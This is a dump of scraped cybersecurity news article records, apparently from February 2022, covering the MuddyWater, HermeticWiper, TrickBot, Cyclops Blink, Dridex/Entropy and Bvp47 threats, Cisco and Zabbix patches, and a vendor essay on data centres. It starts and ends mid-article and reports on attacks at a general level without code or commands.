Python-based implant used for maintaining a foothold in the network by leveraging the Telegram API for C2 communications to evade detection.\nOther key pieces of malware are Canopy, a Windows Script File (.WSF) used to collect and transmit system metadata to an adversary-controlled IP address, and two backdoors called Mori and POWERSTATS that are used to run commands received from the C2 and maintain persistent access.\nRounding up the arsenal of tools employed by MuddyWater is a survey script to enumerate and transmit information about victim computers back to the remote C2 server. Also deployed is a newly identified PowerShell backdoor that’s used to execute commands received from the attacker.\nTo create barriers for potential attacks, the agencies are recommending organizations to use multi-factor authentication wherever applicable, limit the use of administrator privileges, implement phishing protections, and prioritize patching known exploited vulnerabilities.\n\n\nFound this article interesting?

{'title': 'Putin Warns Russian Critical Infrastructure to Brace for Potential Cyber Attacks',
'text': 'The Russian government on Thursday warned of cyber attacks aimed at domestic critical infrastructure operators, as the country’s full-blown invasion of Ukraine enters the second day.\nIn addition to cautioning of the “threat of an increase in the intensity of computer attacks,“ Russia’s National Computer Incident Response and Coordination Center said that the “attacks can be aimed at disrupting the functioning of important information resources and services, causing reputational damage, including for political purposes.“\n“Any failure in the operation of [critical information infrastructure] objects due to a reason that is not reliably established, first of all, should be considered as the result of a computer attack,“ the agency added.\nFurthermore, it notified of possible influence operations undertaken to “form a negative image of the Russian Federation in the eyes of the world community,“ echoing a similar alert released by the U.S. Cybersecurity and Infrastructure Security Agency (CISA) last week about information manipulation efforts from foreign actors to strike critical entities.\n\nThe agency, however, didn’t share more specifics on the nature of the attacks or their provenance.\nThe advisory comes as multiple government and banking websites in Russia, including that of military (mil.ru), the Kremlin (kremlin.ru), and the State Duma (duma.gov.ru), were rendered unreachable amid a spate of cyber offensives targeting Ukraine that resulted in the deployment of a data wiper called HermeticWiper on hundreds of machines in the East European nation.\n“It’s important to note that the wiper leverages high privileges on the compromised host to make the host ’unbootable’ by overriding the boot records and configurations, erase device configurations, and delete shadow copies,“ Lavi Lazarovitz, head of security research at CyberArk Labs, said in a statement shared with The Hacker News.\n“The wiper is configured to not encrypt domain controllers – that is to keep the domain running and allow the ransomware to use valid credentials to authenticate to servers and encrypt those. This further highlights that the threat actors use compromised identities to access the network and / or move laterally,“ Lazarovitz elaborated.\nIt’s not clear how many networks have been affected by the previously unseen data-wiping malware, which targeted organizations in the financial, defense, aviation, and IT industries, according to Symantec. The Broadcom-owned company also said it observed evidence of wiper attacks against machines in Lithuania, implying a spillover effect.\nWhat’s more, HermeticWiper shares overlaps with another data wiper called WhisperGate that was first reported as being used against Ukrainian organizations in January. Like the latter, the newly discovered malware is accompanied by the distribution of a ransomware strain on compromised systems.\nThe ransomware malware is a 64-bit, 3.14 MB .EXE file, written in Golang, per Cybereason’s incident response engineer, Chen Erlich, who shared a preliminary analysis of the executable.\n\n“It appears likely that the ransomware was used as a decoy or distraction from the wiper attacks,“ Symantec said. “This has some similarities to the earlier WhisperGate wiper attacks against Ukraine, where the wiper was disguised as ransomware.“\nInitial forensic analysis suggests that the attacks may have been in preparation mode for at least three months, what with potentially related malicious activity detected in a Lithuanian organization as early as November 12, 2021. Also, one of the HermeticWiper samples was found to have a compilation timestamp of December 28, 2021.\nWhile the latest disruptive actions are yet to be formally attributed, the U.K. and U.S. governments linked the DDoS attacks on Ukraine in mid-February to Russia’s Main Intelligence Directorate (also known as GRU).\nAs the attacks continue to unfold both on the physical and digital realms, Reuters reported that the Ukrainian government is seeking the help of the underground hacker community in the country to fend off cyber infiltrations aimed at critical infrastructure and conduct covert espionage missions against the invading Russian forces.\n\n\nFound this article interesting?

{'title': 'Notorious TrickBot Malware Gang Shuts Down its Botnet Infrastructure',
'text': 'The modular Windows crimeware platform known as TrickBot formally shuttered its infrastructure on Thursday after reports emerged of its imminent retirement amid a lull in its activity for almost two months, marking an end to one of the most persistent malware campaigns in recent years.\n“TrickBot is gone... It is official now as of Thursday, February 24, 2022. See you soon... or not,“ AdvIntel’s CEO Vitali Kremez tweeted. “TrickBot is gone as it has become inefficient for targeted intrusions.“\nAttributed to a Russia-based criminal enterprise called Wizard Spider, TrickBot started out as a financial trojan in late 2016 and is a derivative of another banking malware called Dyre that was dismantled in November 2015. Over the years, it morphed into a veritable Swiss Army knife of malicious capabilities, enabling threat actors to steal information via web injects and drop additional payloads.\n\nTrickBot’s activities took a noticeable hit in October 2020 when the U.S. Cyber Command and a consortium of private security companies led by Microsoft attempted to disrupt most of its infrastructure, forcing the malware’s authors to scale up and evolve its tactics.\nThe criminal entity is said to have invested more than $20 million into its infrastructure and growth, security firm Hold Security was quoted as saying in a WIRED report earlier this month, calling out TrickBot’s “businesslike structure“ to run its day-to-day operations and “hire“ new engineers into the group.\nThe development comes as twin reports from cybersecurity firms AdvIntel and Intel 471 hinted at the possibility that TrickBot’s five-year-saga may be coming to an end in the wake of increased visibility into their malware operations, prompting the operators to shift to newer, improved malware such as BazarBackdoor (aka BazarLoader).\n“TrickBot, after all, is relatively old malware that hasn’t been updated in a major way,“ Intel 471 researchers said. “Detection rates are high and the network traffic from bot communication is easily recognized.“\nIndeed, malware tracking research project Abuse.ch’s Feodo Tracker shows that while no new command-and-control (C2) servers have been set up for TrickBot attacks since December 16, 2021, BazarLoader and Emotet are in full swing, with new C2 servers registered as recently as February 19 and 24, respectively.\n\nBazarBackdoor, which first appeared in 2021, originated as a part of TrickBot’s modular toolkit arsenal but has since evolved into a fully autonomous malware mainly used by the Conti (previously Ryuk) cybercrime gang to deploy ransomware on enterprise networks.\nTrickBot’s demise has also come as the operators of Conti ransomware recruited top talent from the former to focus on stealthier replacement malware like BazarBackdoor. “TrickBot has been linked with Conti for a while, so further synergy there is highly possible,“ Intel 471 told The Hacker News.\nConti has also been credited with resurrecting and integrating the Emotet botnet into its multi-pronged attack framework starting November 2021, with TrickBot, ironically, utilized as a delivery vehicle to distribute the malware after a gap of 10 months.\n“However, the people who have led TrickBot throughout its long run will not simply disappear,“ AdvIntel noted last week. “After being ’acquired’ by Conti, they are now rich in prospects with the secure ground beneath them, and Conti will always find a way to make use of the available talent.“\n\n\nFound this article interesting?

'text': 'Cisco has released software updates to address four security vulnerabilities in its software that could be weaponized by malicious actors to take control of affected systems.\nThe most critical of the flaws is CVE-2022-20650 (CVSS score: 8.8), which relates to a command injection flaw in the NX-API feature of Cisco NX-OS Software that stems from a lack of sufficient input validation of user-supplied data.\n“An attacker could exploit this vulnerability by sending a crafted HTTP POST request to the NX-API of an affected device,“ Cisco said. “A successful exploit could allow the attacker to execute arbitrary commands with root privileges on the underlying operating system.“\n\nThe flaw impacts Nexus 3000 Series Switches, Nexus 5500 Platform Switches, Nexus 5600 Platform Switches, Nexus 6000 Series Switches, and Nexus 9000 Series Switches in standalone NX-OS mode running Cisco NX-OS Software that have the NX-API feature enabled.\nAlso patched are two high-severity denial-of-service (DoS) bugs in NX-OS – CVE-2022-20624 and CVE-2022-20623 (CVSS scores: 8.6) – found in the Cisco Fabric Services Over IP (CFSoIP) and Bidirectional Forwarding Detection (BFD) traffic functions.\n\nCVE-2022-20624, which was reported to Cisco by the U.S. National Security Agency (NSA), impacts Nexus 3000 and 9000 Series Switches and UCS 6400 Series Fabric Interconnects, assuming CFSoIP is enabled. CVE-2022-20623, on the other hand, only affects Nexus 9000 Series Switches that have BFD toggled on.\nLastly, the networking equipment maker also patched a third DoS vulnerability (CVE-2022-20625, CVSS score: 4.3) in the Cisco Discovery Protocol service of Cisco FXOS Software and Cisco NX-OS Software, which could “allow an unauthenticated, adjacent attacker to cause the service to restart, resulting in a denial of service (DoS) condition.“\nCisco said that it’s not aware of “any public announcements or malicious use“ of the aforementioned vulnerabilities.

{'title': 'TrickBot Gang Likely Shifting Operations to Switch to New Malware',
'text': 'TrickBot, the infamous Windows crimeware-as-a-service (CaaS) solution that’s used by a variety of threat actors to deliver next-stage payloads like ransomware, appears to be undergoing a transition of sorts, with no new activity recorded since the start of the year.\nThe lull in the malware campaigns is “partially due to a big shift from Trickbot’s operators, including working with the operators of Emotet,“ researchers from Intel 471 said in a report shared with The Hacker News.\nThe last set of attacks involving TrickBot were registered on December 28, 2021, even as command-and-control (C2) infrastructure associated with the malware has continued to serve additional plugins and web injects to infected nodes in the botnet.\n\nInterestingly, the decrease in the volume of the campaigns has also been accompanied by the TrickBot gang working closely with the operators of Emotet, which witnessed a resurgence late last year after a 10-month-long break following law enforcement efforts to tackle the malware.\nThe attacks, which were first observed in November 2021, featured an infection sequence that used TrickBot as a conduit to download and execute Emotet binaries, when prior to the takedown, Emotet was often used to drop TrickBot samples.\n“It’s likely that the TrickBot operators have phased TrickBot malware out of their operations in favor of other platforms, such as Emotet,“ the researchers said. “TrickBot, after all, is relatively old malware that hasn’t been updated in a major way.“\nAdditionally, Intel 471 said it observed instances of TrickBot pushing Qbot installs to the compromised systems shortly after Emotet’s return in November 2021, once again raising the possibility of a behind-the-scenes shake-up to migrate to other platforms.\nWith TrickBot increasingly coming under the lens of law enforcement in 2021, it’s perhaps not too surprising that the threat actor behind it is actively attempting to shift tactics and update their defensive measures.\n\nAccording to a separate report published by Advanced Intelligence (AdvIntel) last week, the Conti ransomware cartel is believed to have acqui-hired several elite developers of TrickBot to retire the malware and switch to upgraded variants such as BazarBackdoor.\n“Perhaps a combination of unwanted attention to TrickBot and the availability of newer, improved malware platforms has convinced the operators of TrickBot to abandon it,“ the researchers noted. “We suspect that the malware control infrastructure (C2) is being maintained because there is still some monetization value in the remaining bots.“\n\n\nFound this article interesting?

{'title': 'From Pet Systems to Cattle Farm — What Happened to the Data Center?',
'text': 'There’s something about craftsmanship. It’s personal, its artistry, and it can be incredibly effective in achieving its goals. On the other hand, mass-market production can be effective in other ways, through speed, efficiency, and cost savings.\nThe story of data centers is one of going from craftsmanship – where every individual machine is a pet project, maintained with great care – to mass production with big server farms where individual units are completely disposable.\nIn this article, we take a look at how data centers have changed shape over the decades. We examine the implications for data center workloads, and for the people that run them – who have now lost their pet systems. We’ll also review the cybersecurity implications of the new data center landscape.\nPet system with a big purpose\nFor any sysadmin who started their career before the advent of virtualization and other cloud and automation technologies, systems were finely crafted pieces of hardware – and treated with the same love as a pet.\nIt starts with the 1940s emergence of computer rooms – where big machines manually connected by miles of wires were what could only be called a labor of love. These computer rooms contained the steam engines of the computing age, soon to be replaced with more sophisticated equipment thanks to the silicon revolutions. As for security? A big lock on the door was all that was needed.\nMainframes, the precursors to today’s data centers, were finely crafted solutions too, with a single machine taking up an entire room and needing continuous, expert craftsmanship to continue operating. That involved both hardware skills and coding skills where mainframe operators must code on the fly to keep their workloads running.\nFrom a security perspective, mainframes were reasonably easy to manage. It was (way) before the dawn of the internet age, and IT managers’ pet systems were at reasonably limited risk of breach. The first computer viruses emerged in the 1970s, but these were hardly of risk to mainframe operations.\nPrefab computing power with unique management requirements\nBring on the 1990s and the emergence of data centers. Individual, mass-produced machines offered off-the-shelf computing power that was much more affordable than mainframe units. A data center simply consisted of a collection of these computers – all hooked up to each other. Later in the decade, the data center was also connected to the internet.\nThough the individual machines required minimal physical maintenance, the software that drove the workloads for these machines required continuous maintenance. The 1990’s data center was very much composed of pet systems. That counted for every machine, which was an act of server management craftsmanship.\nFrom manual software updates to running backups and maintaining the network, IT admins had their work cut out – if not in physically maintaining machines, then certainly in managing the software that supports their workloads.\nIt’s also an era that first exposed corporate workloads to external security vulnerabilities. With data centers now linked up to the internet, there was suddenly a doorway for attackers to enter into data centers. It puts IT admin’s pet systems at risk – the risk of data theft, risk of equipment misuse, etc.\nSo, security became a major concern. Firewalls, threat detection, and regular patching against vulnerabilities are the sort of security tools that IT admins had to adopt to protect their pet systems through the turn of the millennium.\nServer farms – mass-produced, mass managed\nThe 2000s saw a major change in the way that workloads were handled in the data center. The core drive behind this change was efficiency and flexibility. Given the huge demand for computing workloads, solutions including virtualization, and containerization a bit further after that, quickly gained ground.\nBy loosening the strict link between hardware and operating system, virtualization meant that workloads became relatively speaking independent from the machines that run them. The net result brought a wide range of benefits. Load balancing, for example, ensures that tough workloads always have access to computing power, without the need for excessive financial investment in computing power. High availability, in turn, is designed to eliminate downtime.\nAs for individual machines – well, these are now completely disposable. The technologies in use in modern data centers mean that individual machines have essentially no meaning – they’re just cogs in a much larger operation.\nThese machines no longer had nice individual names and simply became instances – e.g., the webserver service is no longer provided by the incredibly powerful “Aldebaran“ server, but rather by a cadre of “webserver-001“ to “webserver-032“. Tech teams could no longer afford to spend the time to adjust each one as precisely as before, but the large numbers used and efficiency gained thanks to virtualization meant that the overall computing power in the room would still surpass the results of pet systems.\nLimited opportunity for craftsmanship\nContainer technologies like Docker, and Kubernetes more recently, have taken this process even further. You no longer need to dedicate full systems to perform a given task, you just need the basic infrastructure provided by the container to run a service or application. It’s even faster and more efficient to have countless containers underpinning a service rather than specific, dedicated systems for each task.\nDeploying a new system no longer requires the manual installation of an operating system or a labor-intensive configuration and service deployment process. Everything now resides in “recipe“ files, simple text-based documents that describe how a system should behave, using tools like Ansible, Puppet or Chef.\nIT admins could still include some tweaks or optimizations in these deployments but, because each server is no longer unique, and because there are so many of them supporting each service, it hardly makes sense to spend the effort to do so. Admins that need more performance can always reuse the recipe to fire up a few more systems.\nWhile a few core services, like identity management servers or other systems storing critical information would still remain as pets, the majority were now regarded as cattle - sure, you didn’t want any of them to fail, but if one did, it could quickly get replaced with another, equally unremarkable, system performing a specific task.\nTake into account the fact that workloads are increasingly operating on rented computing resources residing in large cloud facilities and it’s clear that the days of running servers as a pet system are over. It’s now about mass production – in an almost extreme way. Is that a good thing?\nMass production is great: but there are new risks\nFlexibility and efficiency brought along by mass production are good things. In the computing environment, little is lost by no longer needing to “handcraft“ and “nurture“ computing environments. It’s a much sleeker, faster way to make workloads go live and to make sure that they stay live.\nBut there are a number of security implications. While security could be “crafted“ into pet systems, cattle environments require a slightly different approach – and certainly still requires a strong focus on security. For example, cattle systems are spawned from the same recipe files, so any intrinsic flaws in the base images used for them will be also deployed at scale. This directly translates to a larger attack surface when a vulnerability surfaces, as there are just many more possible targets. In this situation, it doesn’t really matter if you can fire up a new system within minutes or even seconds - do that over thousands of servers at once and your workloads will be impacted regardless of the time it takes, and that will impact your bottom line.\nTo a large degree, automation is now the answer to security in server farms. Think about tools like automated penetration scanning, and automated live patching tools. These tools provide more airtight security against an equally automated threat, and reduce the administrative overhead of managing these systems.\nA changed computing landscape\nThe evolving environment in IT has changed the architecture of the data center, and the approach of the people who make data centers work. It’s simply not feasible to rely on old practices and expect to have the best results - and this is a tough challenge, as it requires a considerable amount of effort by sysadmins and other IT practitioners - it’s a significant mindset change and it takes a conscious effort to change the way you reason about system administration, but some underlying principles, like security, still apply. Given how vulnerability numbers don’t seem to go down - quite the opposite, in fact - it will continue to apply in the foreseeable future, regardless of other evolutionary changes affecting your data center.\nRather than opposing it, IT admins should accept that their pet systems are now, for all intents and purposes, gone – replaced by mass production delivery. It also means accepting that the security challenges are still here – but in a changed shape.\nIn making server workloads run efficiently, IT admins rely on a new toolset, with adapted methods that rely on automating tasks that can no longer be performed manually. So, similarly, in running server farm security operations, IT admins need to take a look at patching automation tools like TuxCare’s KernelCare Enterprise, and see how they fit into their new toolset.\n\n\nFound this article interesting?

'text': 'The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has warned of active exploitation of two security flaws impacting Zabbix open-source enterprise monitoring platform, adding them to its Known Exploited Vulnerabilities Catalog.\nOn top of that, CISA is also recommending that Federal Civilian Executive Branch (FCEB) agencies patch all systems against the vulnerabilities by March 8, 2022 to reduce their exposure to potential cyberattacks.\n\nTracked as CVE-2022-23131 (CVSS score: 9.8) and CVE-2022-23134 (CVSS score: 5.3), the shortcomings could lead to the compromise of complete networks, enabling a malicious unauthenticated actor to escalate privileges and gain admin access to the Zabbix Frontend as well as make configuration changes.\n\nThomas Chauchefoin from SonarSource has been credited with discovering and reporting the two flaws, which affect Zabbix Web Frontend versions up to and including 5.4.8, 5.0.18 and 4.0.36. The issues have since been addressed in versions 5.4.9, 5.0.9 and 4.0.37 shipped late December 2021.\n\nBoth the flaws are the result of what the company calls “unsafe session storage,“ allowing attackers to bypass authentication and execute arbitrary code.

{'title': 'U.S., U.K. Agencies Warn of New Russian Botnet Built from Hacked Firewall Devices',
'text': 'Intelligence agencies in the U.K. and the U.S. disclosed details of a new botnet malware called Cyclops Blink that’s been attributed to the Russian-backed Sandworm hacking group and deployed in attacks dating back to 2019.\n“Cyclops Blink appears to be a replacement framework for the VPNFilter malware exposed in 2018, which exploited network devices, primarily small office/home office (SOHO) routers, and network-attached storage (NAS) devices,“ the agencies said. “In common with VPNFilter, Cyclops Blink deployment also appears indiscriminate and widespread.“\nThe joint government advisory comes from the U.K. National Cyber Security Centre (NCSC), the Cybersecurity and Infrastructure Security Agency (CISA), the National Security Agency (NSA), and the Federal Bureau of Investigation (FBI) in the U.S.\n\nSandworm, aka Voodoo Bear, is the name assigned to a highly advanced adversary operating out of Russia that’s known to be active since at least 2008. The hacking group has displayed a particular focus on targeting entities in Ukraine and is alleged to be behind the Ukrainian energy sector attacks that caused widespread power outages in late 2015.\nThe threat actor, in October 2020, was formally linked to Russia’s General Staff Main Intelligence Directorate (GRU) Main Center for Special Technologies (GTsST) military unit 74455.\nVPNFilter was first documented by Cisco Talos in May 2018, describing it as a “sophisticated modular malware system“ that shares overlaps with the Sandworm’s BlackEnergy malware and features capabilities to support intelligence-collection and destructive cyber attack operations.\n\nThe IoT botnet malware was found to have compromised more than 500,000 routers in at least 54 countries, targeting devices from Linksys, MikroTik, NETGEAR, and TP-Link, ASUS, D-Link, Huawei, Ubiquiti, QNAP, UPVEL, and ZTE.\nThat same month, the U.S. government announced the seizure and takedown of a key internet domain used for the attacks, urging owners of SOHO and NAS appliances that may be infected to reboot their devices to temporarily disrupt the malware.\nAs of January 2021, an analysis from Trend Micro identified “residual infections“ still remaining on thousands of networks years after sinkholing VPNFilter, even as the Sandworm actor simultaneously opted to retool the malware in response to public disclosures.\nCyclops Blink, as the substitute is called, is believed to have been in action since at least June 2019 primarily setting its eyes on WatchGuard firewall devices, although the agencies said that the malware could be repurposed to strike other architectures and firmware.\n\nEven more concerningly, the botnet malware is deployed as a fake update and is capable of surviving reboots and firmware upgrades, with command-and-control (C2) communications facilitated over the Tor anonymity network.\n“The malware itself is sophisticated and modular with basic core functionality to beacon device information back to a server and enable files to be downloaded and executed,“ the researchers noted. “There is also functionality to add new modules while the malware is running, which allows Sandworm to implement additional capability as required.“\nWatchGuard, in an independent bulletin, called it a state-sponsored botnet that leveraged a previously identified security vulnerability in the Firebox firmware as the initial access vector. The shortcoming was eventually addressed as of May 2021.\n“Based on current estimates, Cyclops Blink may have affected approximately 1% of active WatchGuard firewall appliances,“ the company said. “Only those appliances that had been configured to have management open to the Internet are vulnerable to Cyclops Blink.“\nThe Seattle-headquartered firm is also recommending customers to immediately follow the steps outlined in the 4-Step Cyclops Blink Diagnosis and Remediation Plan to diagnose and eliminate the threat posed by potential malicious activity from the botnet.\nThe findings come as Russia formally launched a full scale military operation to invade Ukraine, just as its IT infrastructure was crippled by a string of data wiper and distributed denial-of-service (DDoS) attacks.\n\n\nFound this article interesting?

{'title': 'New Wiper Malware Targeting Ukraine Amid Russia’s Military Operation',
'text': 'Cybersecurity firms ESET and Broadcom’s Symantec said they discovered a new data wiper malware used in fresh attacks against hundreds of machines in Ukraine, as Russian forces formally launched a full-scale military operation against the country.\nThe Slovak company dubbed the wiper “HermeticWiper“ (aka KillDisk.NCV), with one of the malware samples compiled on December 28, 2021, implying that preparations for the attacks may have been underway for nearly two months.\n“The wiper binary is signed using a code signing certificate issued to Hermetica Digital Ltd,“ ESET said in a series of tweets. “The wiper abuses legitimate drivers from the EaseUS Partition Master software in order to corrupt data. As a final step the wiper reboots [the] computer.“\n\nSpecifically, HermeticWiper is delivered via the benign but signed EaseUS partition management driver that then proceeds to impair the first 512 bytes, the Master Boot Record (MBR) for every physical drive, before initiating a system shutdown and effectively rendering the machine inoperable.\n\n“After a week of defacements and increasing DDoS attacks, the proliferation of sabotage operations through wiper malware is an expected and regrettable escalation,“ SentinelOne’s principal threat researcher Juan Andres Guerrero-Saade said in a report analyzing the new malware.\nAt least one of the intrusions involved deploying the malware directly from the Windows domain controller, indicating that the attackers had taken control of the target network.\nThe scale and the impact of the data-wiping attacks remains unknown as yet, as is the identity of the threat actor behind the infections. But the development marks the second time this year that a destructive malware has been deployed on Ukrainian computer systems after the WhisperGate operation in mid-January.\nThe wiper attacks also follow a third “massive“ wave of distributed denial-of-service (DDoS) attacks that hit several Ukrainian government and banking institutions on Wednesday, knocking out online portals for the Ministry of Foreign Affairs, Cabinet of Ministers, and Rada, the country’s parliament.\n\nLast week, two of the largest Ukrainian banks, PrivatBank and Oschadbank, as well as the websites of the Ukrainian Ministry of Defense and the Armed Forces suffered outages as a result of a DDoS attack from unknown actors, prompting the U.K. and U.S. governments to point the fingers at the Russian Main Intelligence Directorate (GRU), an allegation the Kremlin has denied.\n\nCampaigns that use DDoS attacks deliver torrents of junk traffic that are intended to overwhelm targets with the goal of rendering them inaccessible. A subsequent analysis of the February 15 incidents by the CERT-UA found that they were carried out using botnets such as Mirai and Mēris by leveraging compromised MikroTik routers and other IoT devices.\n\nWhat’s more, information systems belonging to Ukraine’s state institutions are said to have been unsuccessfully targeted in as many as 121 cyber attacks in January 2022 alone.\nThat’s not all. Cybercriminals on the dark web are looking to capitalize on the ongoing political tensions by advertising databases and network accesses containing information on Ukrainian citizens and critical infra entities on RaidForums and Free Civilian marketplaces in “hopes of gaining high profits,“ according to a report published by Accenture earlier this week.\nThe continuous onslaught of disruptive malicious cyber acts since the start of the year has also led the Ukrainian law enforcement authority to paint the attacks as an effort to spread anxiety, undermine confidence in the state’s ability to defend its citizens, and destabilize its unity.\n“Ukraine is facing attempts to systematically sow panic, spread fake information and distort the real state of affairs,“ the Security Service of Ukraine (SSU) said on February 14. “All this combined is nothing more than another massive wave of hybrid warfare.“\n\n\nFound this article interesting?

{'title': 'Dridex Malware Deploying Entropy Ransomware on Hacked Computers',
'text': 'Similarities have been unearthed between the Dridex general-purpose malware and a little-known ransomware strain called Entropy, suggesting that the operators are continuing to rebrand their extortion operations under a different name.\n“The similarities are in the software packer used to conceal the ransomware code, in the malware subroutines designed to find and obfuscate commands (API calls), and in the subroutines used to decrypt encrypted text,“ cybersecurity firm Sophos said in a report shared with The Hacker News.\nThe commonalities were uncovered following two unrelated incidents targeting an unnamed media company and a regional government agency. In both cases, the deployment of Entropy was preceded by infecting the target networks with Cobalt Strike Beacons and Dridex, granting the attackers remote access.\nDespite consistency in some aspects of the twin attacks, they also varied significantly with regards to the initial access vector used to worm their way inside the networks, the length of time spent in each of the environments, and the malware employed to launch the final phase of the invasion.\n\nThe attack on the media organization used the ProxyShell exploit to strike a vulnerable Exchange Server with the goal of installing a web shell that, in turn, was utilized to spread Cobalt Strike Beacons on the network. The adversary is said to have spent four months carrying out reconnaissance and data theft, ultimately paving the way for the ransomware attack in early December 2021.\nThe second attack on the regional government organization, on the other hand, was facilitated through a malicious email attachment containing the Dridex malware, using it to deploy additional payloads for lateral movement.\nNotably, redundant exfiltration of sensitive data to more than one cloud storage provider – in the form of compressed RAR archives – transpired within 75 hours after the initial detection of a suspicious login attempt on a single machine, prior to encrypting the files on the compromised computers.\nEntropy Ransomware Note\nBesides using legitimate tools such as AdFind, PsExec, and PsKill to carry out the attacks, the correlation between Dridex and Entropy samples with that of previous DoppelPaymer ransomware infections has raised the possibility of a “common origin.“\nIt’s worth pointing out the web of connections between the different pieces of malware. The Dridex trojan, an information-stealing botnet, is known to be the handiwork of a prolific Russia-based cybercrime group called Indrik Spider (aka Evil Corp).\nDoppelPaymer is attributed to a splinter group tracked under the moniker Doppel Spider, which leverages forked malware code developed by Indrik Spider, including the BitPaymer ransomware, as the foundation for its big game hunting operations.\nImage Source: SentinelOne Labs\nIn December 2019, the U.S. Treasury Department sanctioned Evil Corp and filed criminal charges against two key members Maksim Yakubets and Igor Turashev, in addition to announcing a $5 million reward for any information leading to their arrests. A subsequent investigation by BBC in November 2021 tracked down the “alleged hackers living millionaire lifestyles, with little chance of ever being arrested.“\n\nThe e-crime gang has since cycled through numerous branding changes to their ransomware infrastructure in the intervening years to get around the sanctions, chief among them being WastedLocker, Hades, Phoenix, PayloadBIN, Grief, and Macaw. Entropy is likely the latest addition to this list.\nThat said, it’s also possible that the malware operators have borrowed the code, either to save development efforts or deliberately mislead attribution in what’s a false flag operation.\n“In both cases, the attackers relied upon a lack of diligence – both targets had vulnerable Windows systems that lacked current patches and updates,“ said Andrew Brandt, principal researcher at Sophos. “Properly patched machines, like the Exchange Server, would have forced the attackers to work harder to make their initial access into the organizations they penetrated.“\n“A requirement to use multi-factor authentication, had it been in place, would have created further challenges for unauthorized users to log in to those or other machines,“ Brandt added.\nIf anything, the findings demonstrate that the Evil Corp cluster continues to advance their tradecraft despite the sanctions, constantly updating their payload signatures, exploitation tools and methods of initial access in order to confuse attribution and stay under the radar.\nIndeed, researchers from SentinelOne, in a standalone analysis, called out the “evolutionary“ links, citing near-identical configuration, implementation, and functionality between successive variants of the ransomware, with the file-encrypting malware concealed using a packer called CryptOne.\n“While there are some observed similarities, there is not currently enough corroborated evidence to directly tie Entropy to Evil Corp and the greater, historical, operation,“ Antonio Pirozzi, SentinelOne’s senior threat intelligence researcher, told The Hacker News. “Based on the information available at this time, we are treating them as different entities.“\n\n\nFound this article interesting?

{'title': 'Chinese Experts Uncover Details of Equation Group’s Bvp47 Covert Hacking Tool',
'text': 'Researchers from China’s Pangu Lab have disclosed details of a “top-tier“ backdoor put to use by the Equation Group, an advanced persistent threat (APT) with alleged ties to the cyber-warfare intelligence-gathering unit of the U.S. National Security Agency (NSA).\nDubbed “Bvp47“ owing to numerous references to the string “Bvp“ and the numerical value “0x47“ used in the encryption algorithm, the backdoor was extracted from Linux systems “during an in-depth forensic investigation of a host in a key domestic department“ in 2013.\nThe defense research group codenamed the attacks involving the deployment of Bvp47 “Operation Telescreen,“ with the implant featuring an “advanced covert channel behavior based on TCP SYN packets, code obfuscation, system hiding, and self-destruction design.“\nBvp47 is said to have been used on more than 287 targets in the academia, economic development, military, science, and telecom sectors located in 45 countries, mainly in China, Korea, Japan, Germany, Spain, India, and Mexico, all the while going largely undetected for over a decade.\nThe elusive backdoor is also equipped with a remote control function that’s protected using an encryption algorithm, activating which requires the attacker’s private key – something the researchers said they found in the leaks published by the Shadow Brokers hacker group in 2016.\n\nPangu Lab is a research project of Pangu Team, which has a history of jailbreaking Apple iPhones dating all the way back to 2014. At the Tianfu Cup hacking contest last year, the white hat hacking team demonstrated several security flaws that allowed for remotely jailbreaking a fully patched iPhone 13 Pro running iOS 15.\nThe Shadow Brokers leaks\nEquation Group, designated as the “crown creator of cyber espionage“ by Russian security firm Kaspersky, is the name assigned to a sophisticated adversary that’s been active since at least 2001 and has used previously undisclosed zero-day exploits to “infect victims, retrieve data and hide activity in an outstandingly professional way,“ some of which were later incorporated into Stuxnet.\nThe attacks have targeted a variety of sectors in no less than 42 countries, counting governments, telecom, aerospace, energy, nuclear research, oil and gas, military, nanotechnology, Islamic activists and scholars, media, transportation, financial institutions, and companies developing encryption technologies.\nThe group is believed to be linked to the NSA’s Tailored Access Operations (TAO) unit, while intrusion activities pertaining to a second collective known as Longhorn (aka The Lamberts) have been attributed to the U.S. Central Intelligence Agency (CIA).\nEquation Group’s malware toolset became public knowledge in 2016 when a group calling itself the Shadow Brokers leaked the entire tranche of exploits used by the elite hacking team, with Kaspersky uncovering code-level similarities between the stolen files and that of samples identified as used by the threat actor.\nBvp47 as a covert backdoor\nThe incident analyzed by Pangu Lab comprises two internally compromised servers, an email and an enterprise server named V1 and V2 respectively, and an external domain (identified as A), sporting a novel two-way communication mechanism to exfiltrate sensitive data from the systems.\n\n“There is abnormal communication between external host A and the V1 server,“ the researchers said. “Specifically, A first sends a SYN packet with a 264-byte payload to port 80 of the V1 server, and then the V1 server immediately initiates an external connection to the high-end port of the A machine and maintains a large amount of exchange data.“\nSimultaneously, V1 connects to V2 via the SMB service to perform a number of operations, including logging in to the latter with an administrator account, trying to open terminal services, enumerating directories, and executing PowerShell scripts through scheduled tasks.\n\nV2, for its part, also connects to V1 to retrieve a PowerShell script and an encrypted second-stage payload, the encrypted execution results of which are sent back to V1, which, according to the researchers, “acts as a data transfer between the A machine and the V2 server.“\nThe Bvp47 backdoor installed on the servers consists of two parts, a loader which is responsible for decoding and loading the actual payload into memory. “Bvp47 generally lives in the Linux operating system in the demilitarized zone that communicates with the Internet,“ the researchers said. “It mainly assumes the core control bridge communication role in the overall attack.“\nLinks to the Equation Group\nPangu Lab’s attribution to Equation Group stems from overlaps with exploits contained in a GPG-encrypted archive file published by the Shadow Brokers – “eqgrp-auction-file.tar.xz.gpg“ – as part of a failed auction of the cyber weapons in August 2016.\n\n“In the process of analyzing the ’eqgrp-auction-file.tar.xz.gpg’ file, it was found that Bvp47 and the attacking tools in the compressed package were technically deterministic, mainly including ’dewdrops,’ ’suctionchar_agents,’ ’tipoffs,’ ’StoicSurgeon,’ ’incision’ and other directories,“ the researchers explained.\n  var adpushup = adpushup || {}; adpushup.que = adpushup.que || []; adpushup.que.push(function() { adpushup.triggerAd(“c642f0d8-e2f2-48f9-8dd1-c9ca934ec74e“); });  \n“The ’tipoffs’ directory contains the RSA asymmetric algorithm private key used in the Bvp47 covert channel [for] command execution and other operations. On this basis, it can be confirmed that Bvp47 is from [the] Equation group.“\nThe findings mark the second time hitherto undocumented malware developed by the Equation Group has come to light in as many months. In late December 2021, Check Point Research disclosed details of a diagnostic utility called “DoubleFeature“ that’s used in conjunction with the DanderSpritz malware framework.\n“Judging from the attack tools related to the organization, including Bvp47, Equation group is indeed a first-class hacking group,“ the researchers concluded.\n“The tool is well-designed, powerful, and widely adapted. Its network attack capability equipped by zero-day 